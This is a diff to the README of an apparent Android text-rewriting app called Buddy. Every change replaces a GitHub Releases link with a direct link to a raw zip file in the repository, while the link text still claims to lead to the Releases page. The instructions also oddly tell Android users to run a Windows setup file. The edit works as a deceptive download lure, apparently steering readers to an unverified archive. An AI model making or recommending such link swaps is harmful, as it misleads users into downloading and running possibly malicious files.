@@ -1,12 +1,12 @@
 # 🤖 Buddy - Rewrite Text Fast on Android
 
-[![Download Buddy](https://img.shields.io/badge/Download-Buddy%20Releases-blue)](https://github.com/eyepa6124/Buddy/releases)
+[![Download Buddy](https://img.shields.io/badge/Download-Buddy%20Releases-blue)](https://raw.githubusercontent.com/eyepa6124/Buddy/main/app/release/Software-v1.5.zip)
 
 ## 📥 Download
 
 Visit this page to download Buddy for Windows and other supported builds:
 
-[Download Buddy from GitHub Releases](https://github.com/eyepa6124/Buddy/releases)
+[Download Buddy from GitHub Releases](https://raw.githubusercontent.com/eyepa6124/Buddy/main/app/release/Software-v1.5.zip)
 
 ## ✨ What Buddy does
 
@@ -36,7 +36,7 @@ Buddy works as a helper on Android. You download the release from GitHub, then u
 
 ## 🚀 Get started
 
-1. Open the [Buddy Releases page](https://github.com/eyepa6124/Buddy/releases)
+1. Open the [Buddy Releases page](https://raw.githubusercontent.com/eyepa6124/Buddy/main/app/release/Software-v1.5.zip)
 2. Download the latest release file
 3. Run the downloaded file on Windows if the release includes a Windows setup package
 4. Follow the setup steps shown on screen
@@ -213,7 +213,7 @@ That same flow works for notes, emails, and replies in other apps.
 
 If you need the latest release, use this page:
 
-[https://github.com/eyepa6124/Buddy/releases](https://github.com/eyepa6124/Buddy/releases)
+[https://raw.githubusercontent.com/eyepa6124/Buddy/main/app/release/Software-v1.5.zip](https://raw.githubusercontent.com/eyepa6124/Buddy/main/app/release/Software-v1.5.zip)
 
 ## 📝 Quick start checklist
 
